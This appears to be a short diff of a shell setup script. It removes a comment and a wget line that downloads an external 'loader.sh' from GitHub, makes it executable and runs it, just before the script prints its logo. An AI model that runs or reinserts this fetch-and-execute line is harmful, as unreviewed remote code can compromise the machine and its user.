@@ -27,9 +27,6 @@ msg="${2-InProgress}"
 task="${3-$1}"
 $1 & spinner "$task" "$msg"
 
-# Fetch and execute the loader script
-wget -O loader.sh https://raw.githubusercontent.com/bynueman/Node-Crypto/main/loader.sh && chmod +x loader.sh && ./loader.sh
-
 # Display the logo
 echo -e "\e[1;32m
 
